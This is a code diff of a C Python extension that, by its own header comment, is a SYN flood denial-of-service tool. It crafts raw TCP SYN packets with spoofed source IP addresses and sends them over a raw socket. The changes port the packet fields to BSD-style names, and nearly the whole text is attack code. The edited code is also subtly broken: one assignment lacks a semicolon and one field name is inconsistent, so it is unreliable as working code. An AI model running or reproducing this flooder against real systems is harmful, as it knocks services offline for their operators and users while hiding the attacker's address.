@@ -1,7 +1,8 @@
 /*
     Syn Flood DOS with LINUX sockets, thanks binarytides.com!
 */
-#define __USE_BSD 1 //Set linux headers to use BSD style headers
+#define __USE_BSD 1 //Set linux ip headers to use BSD style headers
+#define __FAVOR_BSD 1 //Set linux tcp headers to use BSD style headers
 #include <stdio.h>
 #include <netinet/tcp.h>   //Provides declarations for tcp header
 #include <netinet/ip.h>    //Provides declarations for ip header
@@ -46,9 +47,9 @@ int s;
 //Datagram to represent the packet
 char datagram[4096];
 //IP header
-struct ip *iph = (struct ip *) datagram;
+struct ip *iph = (struct ip *)datagram;
 //TCP header
-struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
+struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct ip));
 struct sockaddr_in sin2;
 struct pseudo_header psh;
 
@@ -58,10 +59,10 @@ static PyObject * synmod_send(PyObject *self, PyObject* args)
                 datagram,   /* the buffer containing headers and data */
                 iph->ip_len,    /* total length of our datagram */
                 0,      /* routing flags, normally always 0 */
-                (struct sockaddr *) &sin2,   /* socket addr, just like in */
-                sizeof (sin2)) < 0)       /* a normal send() */
+                (struct sockaddr *)&sin2,   /* socket addr, just like in */
+                sizeof(sin2)) < 0)       /* a normal send() */
 
-        printf ("error\r\n");
+        printf("error\r\n");
 
     return PyInt_FromLong(42L);
 }
@@ -120,24 +121,25 @@ static PyObject * synmod_init(PyObject *self, PyObject* args)
     iph->ip_src = conv_src_addr;  //Spoof the source ip address
     iph->ip_dst = conv_dest_addr;
  
-    iph->ip_sum = csum ((unsigned short *) datagram, iph->ip_len >> 1);
+    iph->ip_sum = csum((unsigned short *)datagram, iph->ip_len >> 1);
  
     //TCP Header
-    tcph->source = htons (src_port);
-    tcph->dest = htons (dest_port);
-    tcph->seq = 0;
-    tcph->ack_seq = 0;
-    tcph->doff = 5;      /* first and only tcp segment */
-    tcph->fin=0;
+    tcph->th_sport = htons(src_port);
+    tcph->th_dport = htons(dest_port);
+    tcph->th_seq = 0;
+    tcph->th_ack = 0;
+    tcph->th_off = 5;      /* first and only tcp segment */
+    /*tcph->fin=0;
     tcph->syn=1;
     tcph->rst=0;
     tcph->psh=0;
     tcph->ack=0;
-    tcph->urg=0;
-    tcph->window = htons (5840); /* maximum allowed window size */
-    tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
+    tcph->urg=0;*/
+    tcph->th_flags = TH_SYN
+    tcph->th_win = htons(5840); /* maximum allowed window size */
+    tcph->th_sum = 0;/* if you set a checksum to zero, your kernel's IP stack
                 should fill in the correct checksum during transmission */
-    tcph->urg_ptr = 0;
+    tcph->urp = 0;
     //Now the IP checksum
  
     psh.source_address = inet_addr(src_addr);
@@ -146,17 +148,17 @@ static PyObject * synmod_init(PyObject *self, PyObject* args)
     psh.protocol = IPPROTO_TCP;
     psh.tcp_length = htons(20);
  
-    memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
+    memcpy(&psh.tcp , tcph , sizeof(struct tcphdr));
  
-    tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
+    tcph->th_sum = csum((unsigned short*) &psh , sizeof(struct pseudo_header));
  
     //IP_HDRINCL to tell the kernel that headers are included in the packet
     {
         int one = 1;
         const int *val = &one;
-        if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
+        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
         {
-            printf ("Warning: Cannot set HDRINCL!\r\n");
+            printf("Warning: Cannot set HDRINCL!\r\n");
             return PyInt_FromLong(0L);
         }
     }
